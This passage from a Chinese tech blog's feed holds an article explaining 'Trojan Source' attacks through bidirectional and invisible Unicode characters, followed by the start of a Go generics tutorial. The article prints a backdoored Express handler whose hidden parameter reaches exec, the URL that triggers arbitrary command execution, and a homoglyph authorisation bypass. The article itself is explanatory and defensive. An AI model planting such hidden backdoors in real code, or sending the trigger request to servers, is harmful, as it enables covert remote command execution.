+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright size-full wp-image-21658" src="https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg" alt="" width="340" height="270" srcset="https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv.jpg 340w, https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv-300x238.jpg 300w" sizes="(max-width: 340px) 100vw, 340px" />最近，我们在 Github 的 Code Review 中看到 Github 开始出现下面这个 Warning 信息—— “This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below.”也就是说我们的代码中有一些 bidirectional unicode 的文本，中文直译作 “双向文本”，意思是一些语言是从左到右的，而另一些则是是从右到左的（如：阿拉伯语），如果同一个文件里，即有从左向右的文本也有从右向左文本两种的混搭，那么，就叫bi-direction。术语通常缩写为“ <b>BiDi</b> ”或“ <b>bidi</b> ”。使用双向文本对于中国人来说并不陌生，因为中文又可以从左到右，也可以从右到左，还可以从上到下。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21652" src="https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg" alt="" width="640" height="206" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-1024x329.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-300x96.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-768x247.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427-604x194.jpg 604w, https://coolshell.cn/wp-content/uploads/2021/11/1637305049427.jpg 1288w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>早期的计算机仅设计为基于拉丁字母的从左到右的方式。添加新的字符集和字符编码使许多其他从左到右的脚本能够得到支持，但不容易支持从右到左的脚本，例如阿拉伯语或希伯来语，并且将两者混合使用更是不可能。从右到左的脚本是通过<a title="ISO/IEC 8859-6" href="https://en.wikipedia.org/wiki/ISO/IEC_8859-6">ISO/IEC 8859-6</a>和<a title="ISO/IEC 8859-8" href="https://en.wikipedia.org/wiki/ISO/IEC_8859-8">ISO/IEC 8859-8</a>等编码引入的，通常以书写和阅读顺序存储字母。可以简单地将从左到右的显示顺序翻转为从右到左的显示顺序，但这样做会牺牲正确显示从左到右脚本的能力。通过双向文本支持，可以在同一页面上混合来自不同脚本的字符，而不管书写方向如何。</p>
+<p><span id="more-21649"></span></p>
+<p>双向文本支持是计算机系统正确显示双向文本的能力。对于Unicode来说，其标准为完整的 BiDi 支持提供了基础，其中包含有关如何编码和显示从左到右和从右到左脚本的混合的详细规则。你可以使用一些控制字符来帮助你完成双向文本的编排。</p>
+<p>好的，科普完“双向文本”后，我们正式进入正题，为什么Github 会出这个警告？Github的官方博客“<a href="https://github.blog/changelog/2021-10-31-warning-about-bidirectional-unicode-text/" target="_blank" rel="noopener">关于双向Unicode的警告</a>”中说，使用一些Unicode中的用于控制的隐藏字符，可以让你代码有着跟看上去完全不一样的行为。</p>
+<p>我们先来看一个示例，下面这段 Go 的代码就会把 “Hello, World”的每个字符转成整型，然后计算其中多少个为 1 的 bit。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
+
+import "fmt"
+
+func main() {
+  str, mask := "Hello, World!‮10x‭", 0
+
+  bits := 0
+  for _, ch := range str {
+    for ch &gt; 0 {
+      bits += int(ch) &amp; mask
+      ch = ch &gt;&gt; 1
+    }
+  }
+  fmt.Println("Total bits set:", bits)
+}</pre>
+<p>这个代码你看上去没有什么 奇怪的地方，但是你在执行的时候（可以直接上Go Playground上执行  &#8211;<a href="https://play.golang.org/p/e2BDZvFlet0" target="_blank" rel="noopener"> https://play.golang.org/p/e2BDZvFlet0</a>），你会发现，结果是 0，也就是说“Hello, World”中没有值为 1 的 bit 位。这究竟发生了什么事？</p>
+<p>如果你把上面这段代码拷贝粘贴到字符界面上的 vim 编辑器里，你就可以看到下面这一幕。</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21653" src="https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg" alt="" width="500" height="324" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637307319589.jpg 902w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-300x194.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-768x497.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637307319589-417x270.jpg 417w" sizes="(max-width: 500px) 100vw, 500px" /></p>
+<p>其中有两个浅蓝色的尖括号的东西—— <code>&lt;202e&gt;</code> 和 <code>&lt;202d&gt;</code> 。这两个字符是两个Unicode的控制字符（注：完整的双向文本控制字符参看 <a href="https://www.compart.com/en/unicode/bidiclass" target="_blank" rel="noopener">Unicode Bidirectional Classes</a>）：</p>
+<ul>
+<li><strong>U+202E &#8211; Right-to-Left Override [RLO] </strong><br />
+表示，开始从右到左显示，于是，接下来的文本 <code>10x", 0</code> 变成了 <code>0 ,"x01</code></li>
+<li><strong>U+202D &#8211; Left-to-Right Override [LRO]</strong><br />
+表示，开始从左到右显示，于是，<code>0,"x01</code> 中的前4个字符<code>0 ,"</code> 反转成  <code>", 0</code>，于是整个文本成了 <code>", 0x01</code></li>
+</ul>
+<p>所以，你在视觉上看到的是结果是—— <code>"Hello, World!”, 0x01</code>， 但是实际上是完全是另外一码事。</p>
+<p>然后，Github官方博客中还给了一个安全问题 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42574">CVE-2021-42574</a> ——</p>
+<blockquote><p>在 Unicode 规范到 14.0 的双向算法中发现了一个问题。它允许通过控制序列对字符进行视觉重新排序，可用于制作源代码，呈现与编译器和解释器执行逻辑完全不同的逻辑。攻击者可以利用这一点对接受 Unicode 的编译器的源代码进行编码，从而将目标漏洞引入人类审查者不可见的地方。</p></blockquote>
+<p>这个安全问题在剑桥大学的这篇论文“<a href="https://www.trojansource.codes/" target="_blank" rel="noopener">Some Vulnerabilities are Invisible</a>”中有详细的描述。其中PDF版的文章中也给了这么一个示例：</p>
+<p>通过双向文本可以把下面这段代码：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21655" src="https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg" alt="" width="569" height="240" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637308872541.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308872541-604x255.jpg 604w" sizes="(max-width: 569px) 100vw, 569px" /></p>
+<p>伪装成下面的这个样子：</p>
+<p><img decoding="async" loading="lazy" class="aligncenter wp-image-21654" src="https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg" alt="" width="580" height="245" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637308847435.jpg 692w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-300x127.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637308847435-604x255.jpg 604w" sizes="(max-width: 580px) 100vw, 580px" /></p>
+<p>在图 2 中<code>'alice'</code>被定义为价值 100，然后是一个从 Alice 中减去资金的函数。最后一行以 50 的值调用该函数，因此该小程序在执行时应该给我们 50 的结果。</p>
+<p>然而，图 1 向我们展示了如何使用双向字符来破坏程序的意图：通过插入<strong>RLI (Right To Left Isolate)</strong><i> &#8211; </i><strong>U+2067</strong><i>，</i>我们将文本方向从传统英语更改为从右到左。尽管我们使用了减去资金功能，但图 1 的输出变为 100。</p>
+<p>除此之外，支持Unicode还可以出现很多其它的攻击，尤其是通过一些“不可见字符”，或是通过“同形字符”在源代码里面埋坑。比如文章“<a href="https://certitude.consulting/blog/en/invisible-backdoor/" target="_blank" rel="noopener">The Invisible Javascript Backdoor</a>”里的这个示例：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">const express = require('express');
+const util = require('util');
+const exec = util.promisify(require('child_process').exec);
+
+const app = express();
+
+app.get('/network_health', async (req, res) =&gt; {
+    const { timeout,ㅤ} = req.query;
+    const checkCommands = [
+        'ping -c 1 google.com',
+        'curl -s http://example.com/',ㅤ
+    ];
+
+    try {
+        await Promise.all(checkCommands.map(cmd =&gt; 
+                cmd &amp;&amp; exec(cmd, { timeout: +timeout || 5_000 })));
+        res.status(200);
+        res.send('ok');
+    } catch(e) {
+        res.status(500);
+        res.send('failed');
+    }
+});
+
+app.listen(8080);</pre>
+<p>上面这个代码实现了一个非常简单的网络健康检查，HTTP会执行 <code>ping -c 1 google.com</code> 以及 <code>curl -s http://example.com</code> 这两个命令来查看网络是否正常。其中，可选输入 HTTP 参数<code>timeout</code>限制命令执行时间。</p>
+<p>然后，上面这个代码是有不可见的Unicode 字符，如果你使用VSCode，把编码从 Unicode 改成 DOS (CP437) 后你就可以看到这个Unicode了</p>
+<p><img decoding="async" loading="lazy" class="aligncenter size-large wp-image-21656" src="https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg" alt="" width="640" height="577" srcset="https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-1024x923.jpg 1024w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-300x270.jpg 300w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-768x692.jpg 768w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683-299x270.jpg 299w, https://coolshell.cn/wp-content/uploads/2021/11/1637310735683.jpg 1118w" sizes="(max-width: 640px) 100vw, 640px" /></p>
+<p>于是，一个你看不见的 <code>πàñ</code> 变量就这样生成了，你再仔细看一下整个逻辑，这个看不见的变量，可以让你的代码执行他想要的命令。因为，http 的请求中有第二个参数，这个参数可奖在后面被执行。于是我们可以构造如下的的 HTTP 请求：</p>
+<p style="text-align: center;"><strong>http://host:port/network_health?%E3%85%A4=&lt;any command&gt;</strong></p>
+<p>其中的，%E3%85%A4 就是 <code>\u3164</code> 这个不可见Unicode 的编码，于是，一个后门代码就这样在神不知鬼不觉的情况下注入了。</p>
+<p>另外，还可以使用“同形字符”，看看下面这个示例：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="c">if(environmentǃ=ENV_PROD){
+    // bypass authZ checks in DEV
+    return true;
+}</pre>
+<p>如何你以为 <code>ǃ</code> 是 惊叹号，其实不是，它是一个Unicode <code>╟â</code>。这种东西就算你把你的源码转成 DOS(CP437) 也没用，因为用肉眼在一大堆正常的字符中找不正常的，我觉得是基本不可能的事。</p>
+<p>现在，是时候检查一下你的代码有没有上述的这些情况了……</p>
+<p>（全文完）</p>
+<p>&nbsp;</p>
+<p>&nbsp;<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/2439.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/16.jpg" alt="黑客的价值观" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2439.html" class="wp_rp_title">黑客的价值观</a></li><li ><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg" alt="Web程序的最佳测试数据" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_title">Web程序的最佳测试数据</a></li><li ><a href="https://coolshell.cn/articles/1331.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/11.jpg" alt="Unicode字符预览表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1331.html" class="wp_rp_title">Unicode字符预览表</a></li><li ><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="敏捷水管工" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_title">敏捷水管工</a></li><li ><a href="https://coolshell.cn/articles/10910.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/01/trade-off-150x150.jpg" alt="分布式系统的事务处理" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10910.html" class="wp_rp_title">分布式系统的事务处理</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/21649.html">源代码特洛伊木马攻击</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/21649.html/feed</wfw:commentRss>
+			<slash:comments>23</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Go编程模式 ： 泛型编程</title>
+		<link>https://coolshell.cn/articles/21615.html</link>
+					<comments>https://coolshell.cn/articles/21615.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sat, 04 Sep 2021 05:44:02 +0000</pubDate>
+				<category><![CDATA[Go 语言]]></category>
+		<category><![CDATA[编程语言]]></category>
+		<category><![CDATA[generics]]></category>
+		<category><![CDATA[Go]]></category>
+		<category><![CDATA[golang]]></category>
+		<category><![CDATA[MapReduce]]></category>
+		<category><![CDATA[泛型]]></category>
+		<guid isPermaLink="false">https://coolshell.cn/?p=21615</guid>
+
+					<description><![CDATA[<p>Go语言的1.17版本发布了，其中开始正式支持泛型了。虽然还有一些限制（比如，不能把泛型函数export），但是，可以体验了。我的这个《Go编程模式》的系列终于...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/21615.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/21615.html">Go编程模式 ： 泛型编程</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="alignright wp-image-21627 " src="https://coolshell.cn/wp-content/uploads/2021/09/go-generics-1024x512.png" alt="" width="406" height="203" srcset="https://coolshell.cn/wp-content/uploads/2021/09/go-generics-1024x512.png 1024w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics-300x150.png 300w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics-768x384.png 768w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics-540x270.png 540w, https://coolshell.cn/wp-content/uploads/2021/09/go-generics.png 1200w" sizes="(max-width: 406px) 100vw, 406px" />Go语言的1.17版本发布了，其中开始正式支持泛型了。虽然还有一些限制（比如，不能把泛型函数export），但是，可以体验了。我的这个《Go编程模式》的系列终于有了真正的泛型编程了，再也不需要使用反射或是go generation这些难用的技术了。周末的时候，我把Go 1.17下载下来，然后，体验了一下泛型编程，还是很不错的。下面，就让我们来看一下Go的泛型编程。（注：不过，如果你对泛型编程的重要性还不是很了解的话，你可以先看一下之前的这篇文章《<a title="Go 编程模式：Go Generation" href="https://coolshell.cn/articles/21179.html" target="_blank" rel="noopener">Go编程模式：Go Generation</a>》，然后再读一下《<a title="Go编程模式：Map-Reduce" href="https://coolshell.cn/articles/21164.html" target="_blank" rel="noopener">Go编程模式：MapReduce</a>》）</p>
+<section class="post-series"><h3 class="post-series-title">本文是全系列中第10 / 10篇：<a href="https://coolshell.cn/articles/series/go%e7%bc%96%e7%a8%8b%e6%a8%a1%e5%bc%8f">Go编程模式</a></h3><ul class="post-series-list"><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21128.html">Go编程模式：切片，接口，时间和性能</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21140.html">Go 编程模式：错误处理</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21146.html">Go 编程模式：Functional Options</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21214.html">Go编程模式：委托和反转控制</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21164.html">Go编程模式：Map-Reduce</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21179.html">Go 编程模式：Go Generation</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/17929.html">Go编程模式：修饰器</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21228.html">Go编程模式：Pipeline</a></span></li><li class="post-series-item"><span class="post-series-item-title"><a href="https://coolshell.cn/articles/21263.html">Go 编程模式：k8s Visitor 模式</a></span></li><li class="post-series-item-current post-series-item"><span class="post-series-item-title">Go编程模式 ： 泛型编程</span></li></ul><nav class="post-series-nav"><span class="post-series-nav-prev">&laquo; <a href="https://coolshell.cn/articles/21263.html" rel="prev" title="Go 编程模式：k8s Visitor 模式">上一篇文章</a></span></nav></section>
+<h4>初探</h4>
+<p>我们先来看一个简单的示例：</p>
+<p><span id="more-21615"></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
+
+import "fmt"
+
+func print[T any] (arr []T) {
+  for _, v := range arr {
+    fmt.Print(v)
+    fmt.Print(" ")
+  }
+  fmt.Println("")
+}
+
+func main() {
+  strs := []string{"Hello", "World",  "Generics"}
+  decs := []float64{3.14, 1.14, 1.618, 2.718 }
+  nums := []int{2,4,6,8}
+
+  print(strs)
+  print(decs)
+  print(nums)
+}</pre>
+<p>上面这个例子中，有一个 <code>print()</code> 函数，这个函数就是想输出数组的值，如果没有泛型的话，这个函数需要写出 <code>int</code> 版，<code>float</code>版，<code>string</code> 版，以及我们的自定义类型（<code>struct</code>）的版本。现在好了，有了泛型的支持后，我们可以使用 <code>[T any]</code> 这样的方式来声明一个泛型类型（有点像C++的 <code>typename T</code>），然后面都使用 <code>T</code> 来声明变量就好。</p>
+<p>上面这个示例中，我们泛型的 <code>print()</code> 支持了三种类型的适配—— <code>int</code>型，<code>float64</code>型，和 <code>string</code>型。要让这段程序跑起来需要在编译行上加上 <code>-gcflags=-G=3</code>编译参数（这个编译参数会在1.18版上成为默认参数），如下所示：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ go run -gcflags=-G=3 ./main.go</pre>
+<p>有了个操作以后，我们就可以写一些标准的算法了，比如，一个查找的算法</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func find[T comparable] (arr []T, elem T) int {
+  for i, v := range arr {
+    if  v == elem {
+      return i
+    }
+  }
+  return -1
+}</pre>
+<p>我们注意到，我们没有使用 <code>[T any]</code>的形式，而是使用 <code>[T comparable]</code>的形式，<code>comparable</code>是一个接口类型，其约束了我们的类型需要支持 <code>==</code> 的操作， 不然就会有类型不对的编译错误。上面的这个 <code>find()</code> 函数同样可以使用于 <code>int</code>, <code>float64</code>或是<code>string</code>类型。</p>
+<p>从上面的这两个小程序来看，Go语言的泛型已基本可用了，只不过，还有三个问题：</p>
+<ul>
+<li>一个是 <code>fmt.Printf()</code>中的泛型类型是 <code>%v</code> 还不够好，不能像c++ <code>iostream</code>重载 <code>&gt;&gt;</code> 来获得程序自定义的输出。</li>
+<li>另外一个是，go不支持操作符重载，所以，你也很难在泛型算法中使用“泛型操作符”如：<code>==</code> 等</li>
+<li>最后一个是，上面的 <code>find()</code> 算法依赖于“数组”，对于hash-table、tree、graph、link等数据结构还要重写。也就是说，没有一个像C++ STL那样的一个泛型迭代器（这其中的一部分工作当然也需要通过重载操作符（如：<code>++</code> 来实现）</li>
+</ul>
+<p>不过，这个已经很好了，让我们来看一下，可以干哪些事了。</p>
+<h4>数据结构</h4>
+<h5>Stack 栈</h5>
+<p>编程支持泛型最大的优势就是可以实现类型无关的数据结构了。下面，我们用Slices这个结构体来实现一个Stack的数结构。</p>
+<p>首先，我们可以定义一个泛型的Stack</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">type stack [T any] []T</pre>
+<p>看上去很简单，还是 <code>[T any]</code> ，然后 <code>[]T</code> 就是一个数组，接下来就是实现这个数据结构的各种方法了。下面的代码实现了 <code>push()</code> ，<code>pop()</code>，<code>top()</code>，<code>len()</code>，<code>print()</code>这几个方法，这几个方法和 C++的STL中的 Stack很类似。（注：目前Go的泛型函数不支持 export，所以只能使用第一个字符是小写的函数名）</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func (s *stack[T]) push(elem T) {
+  *s = append(*s, elem)
+}
+
+func (s *stack[T]) pop() {
+  if len(*s) &gt; 0 {
+    *s = (*s)[:len(*s)-1]
+  } 
+}
+func (s *stack[T]) top() *T{
+  if len(*s) &gt; 0 {
+    return &amp;(*s)[len(*s)-1]
+  } 
+  return nil
+}
+
+func (s *stack[T]) len() int{
+  return len(*s)
+}
+
+func (s *stack[T]) print() {
+  for _, elem := range *s {
+    fmt.Print(elem)
+    fmt.Print(" ")
+  }
+  fmt.Println("")
+}</pre>
+<p>上面的这个例子还是比较简单的，不过在实现的过程中，对于一个如果栈为空，那么 <code>top()</code>要么返回<code>error</code>要么返回空值，在这个地方卡了一下。因为，之前，我们返回的“空”值，要么是 int 的<code>0</code>，要么是 string 的 <code>“”</code>，然而在泛型的<code>T</code>下，这个值就不容易搞了。也就是说，除了类型泛型后，还需要有一些“值的泛型”（注：在C++中，如果你要用一个空栈进行 <code>top()</code> 操作，你会得到一个 segmentation fault），所以，这里我们返回的是一个指针，这样可以判断一下指针是否为空。</p>
+<p>下面是如何使用这个stack的代码。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main() {
+
+  ss := stack[string]{}
+  ss.push("Hello")
+  ss.push("Hao")
+  ss.push("Chen")
+  ss.print()
+  fmt.Printf("stack top is - %v\n", *(ss.top()))
+  ss.pop()
+  ss.pop()
+  ss.print()
+
+  
+  ns := stack[int]{}
+  ns.push(10)
+  ns.push(20)
+  ns.print()
+  ns.pop()
+  ns.print()
+  *ns.top() += 1
+  ns.print()
+  ns.pop()
+  fmt.Printf("stack top is - %v\n", ns.top())
+
+}</pre>
+<p>&nbsp;</p>
+<h5>LinkList 双向链表</h5>
+<p>下面我们再来看一个双向链表的实现。下面这个实现中实现了 这几个方法：</p>
+<ul>
+<li><code>add()</code> &#8211; 从头插入一个数据结点</li>
+<li><code>push()</code> &#8211; 从尾插入一个数据结点</li>
+<li><code>del()</code> &#8211; 删除一个结点（因为需要比较，所以使用了 <code>compareable</code> 的泛型）</li>
+<li><code>print()</code> &#8211; 从头遍历一个链表，并输出值。</li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">type node[T comparable] struct {
+  data T
+  prev *node[T]
+  next *node[T]
+}
+
+type list[T comparable] struct {
+  head, tail *node[T]
+  len int
+}
+
+func (l *list[T]) isEmpty() bool {
+  return l.head == nil &amp;&amp; l.tail == nil
+}
+
+func (l *list[T]) add(data T) {
+  n := &amp;node[T] {
+    data : data,
+    prev : nil,
+    next : l.head,
+  }
+  if l.isEmpty() {
+    l.head = n
+    l.tail = n
+  }
+  l.head.prev = n
+  l.head = n
+}
+
+func (l *list[T]) push(data T) { 
+  n := &amp;node[T] {
+    data : data,
+    prev : l.tail,
+    next : nil,
+  }
+  if l.isEmpty() {
+    l.head = n
+    l.tail = n
+  }
+  l.tail.next = n
+  l.tail = n
+}
+
+func (l *list[T]) del(data T) { 
+  for p := l.head; p != nil; p = p.next {
+    if data == p.data {
+      
+      if p == l.head {
+        l.head = p.next
+      }
+      if p == l.tail {
+        l.tail = p.prev
+      }
+      if p.prev != nil {
+        p.prev.next = p.next
+      }
+      if p.next != nil {
+        p.next.prev = p.prev
+      }
+      return 
+    }
+  } 
+}
+
+func (l *list[T]) print() {
+  if l.isEmpty() {
+    fmt.Println("the link list is empty.")
+    return 
+  }
+  for p := l.head; p != nil; p = p.next {
+    fmt.Printf("[%v] -&gt; ", p.data)
+  }
+  fmt.Println("nil")
+}</pre>
+<p>上面这个代码都是一些比较常规的链表操作，学过链表数据结构的同学应该都不陌生，使用的代码也不难，如下所示，都很简单，看代码就好了。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func main(){
+  var l = list[int]{}
+  l.add(1)
+  l.add(2)
+  l.push(3)
+  l.push(4)
+  l.add(5)
+  l.print() //[5] -&gt; [2] -&gt; [1] -&gt; [3] -&gt; [4] -&gt; nil
+  l.del(5)
+  l.del(1)
+  l.del(4)
+  l.print() //[2] -&gt; [3] -&gt; nil
+  
+}</pre>
+<h4>函数式范型</h4>
+<p>接下来，我们就要来看一下我们函数式编程的三大件 <code>map()</code> 、 <code>reduce()</code> 和 <code>filter()</code> 在之前的《<a title="Go编程模式：Map-Reduce" href="https://coolshell.cn/articles/21164.html" target="_blank" rel="noopener">Go编程模式：Map-Reduce</a>》文章中，我们可以看到要实现这样的泛型，需要用到反射，代码复杂到完全读不懂。下面来看一下真正的泛型版本。</p>
+<h5>泛型Map</h5>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func gMap[T1 any, T2 any] (arr []T1, f func(T1) T2) []T2 {
+  result := make([]T2, len(arr))
+  for i, elem := range arr {
+    result[i] = f(elem)
+  }
+  return result
+}</pre>
+<p>在上面的这个 map函数中我使用了两个类型 &#8211; <code>T1</code> 和 <code>T2</code> ，</p>
+<ul>
+<li><code>T1</code> &#8211; 是需要处理数据的类型</li>
+<li><code>T2</code> &#8211; 是处理后的数据类型</li>
+</ul>
+<p><code>T1</code> 和 <code>T2</code> 可以一样，也可以不一样。</p>
+<p>我们还有一个函数参数 &#8211;  <code>func(T1) T2</code> 意味着，进入的是 <code>T1</code> 类型的，出来的是 <code>T2</code> 类型的。</p>
+<p>然后，整个函数返回的是一个 <code>[]T2</code></p>
+<p>好的，我们来看一下怎么使用这个map函数：</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">nums := []int {0,1,2,3,4,5,6,7,8,9}
+squares := gMap(nums, func (elem int) int {
+  return elem * elem
+})
+print(squares)  //0 1 4 9 16 25 36 49 64 81 
+
+strs := []string{"Hao", "Chen", "MegaEase"}
+upstrs := gMap(strs, func(s string) string  {
+  return strings.ToUpper(s)
+})
+print(upstrs) // HAO CHEN MEGAEASE 
+
+
+dict := []string{"零", "壹", "贰", "叁", "肆", "伍", "陆", "柒", "捌", "玖"}
+strs =  gMap(nums, func (elem int) string  {
+  return  dict[elem]
+})
+print(strs) // 零 壹 贰 叁 肆 伍 陆 柒 捌 玖</pre>
+<h5>泛型 Reduce</h5>
+<p>接下来，我们再来看一下我们的Reduce函数，reduce函数是把一堆数据合成一个。</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func gReduce[T1 any, T2 any] (arr []T1, init T2, f func(T2, T1) T2) T2 {
+  result := init
+  for _, elem := range arr {
+    result = f(result, elem)
+  }
+  return result
+}</pre>
+<p>函数实现起来很简单，但是感觉不是很优雅。</p>
+<ul>
+<li>也是有两个类型 <code>T1</code> 和 <code>T2</code>，前者是输出数据的类型，后者是佃出数据的类型。</li>
+<li>因为要合成一个数据，所以需要有这个数据的初始值 <code>init</code>，是 <code>T2</code> 类型</li>
+<li>而自定义函数 <code>func(T2, T1) T2</code>，会把这个init值传给用户，然后用户处理完后再返回出来。</li>
+</ul>
+<p>下面是一个使用上的示例——求一个数组的和</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nums := []int {0,1,2,3,4,5,6,7,8,9}
+sum := gReduce(nums, 0, func (result, elem int) int  {
+    return result + elem
+})
+fmt.Printf("Sum = %d \n", sum)</pre>
+<h5>泛型 filter</h5>
+<p>filter函数主要是用来做过滤的，把数据中一些符合条件（filter in）或是不符合条件（filter out）的数据过滤出来，下面是相关的代码示例</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">func gFilter[T any] (arr []T, in bool, f func(T) bool) []T {
+  result := []T{}
+  for _, elem := range arr {
+    choose := f(elem)
+    if (in &amp;&amp; choose) || (!in &amp;&amp; !choose) {
+      result = append(result, elem)
+    }
+  }
+  return result
+}
+
+func gFilterIn[T any] (arr []T, f func(T) bool) []T {
+  return gFilter(arr, true, f)
+}
+
+func gFilterOut[T any] (arr []T, f func(T) bool) []T {
+  return gFilter(arr, false, f)
+}</pre>
+<p>其中，用户需要提从一个 <code>bool</code> 的函数，我们会把数据传给用户，然后用户只需要告诉我行还是不行，于是我们就会返回一个过滤好的数组给用户。</p>
+<p>比如，我们想把数组中所有的奇数过滤出来</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="golang">nums := []int {0,1,2,3,4,5,6,7,8,9}
+odds := gFilterIn(nums, func (elem int) bool  {
+    return elem % 2 == 1
+})
+print(odds)</pre>
+<h4>业务示例</h4>
